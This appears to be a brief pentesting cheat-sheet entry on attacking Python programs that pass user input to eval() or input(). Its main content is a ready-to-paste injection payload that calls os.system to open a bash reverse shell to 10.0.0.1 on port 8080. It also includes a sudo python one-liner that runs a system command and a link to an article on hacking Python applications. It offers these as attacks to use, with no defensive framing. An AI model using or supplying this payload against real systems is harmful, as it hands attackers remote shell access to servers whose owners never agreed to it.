# Python Input Field

If they use `eval()` or `input`, you can use this to execute shellcode through python os.

```abap
__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#
sudo python -c "os.system('id')" # this doesn't work for input fields but is useful
```

[Hacking Python Applications](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)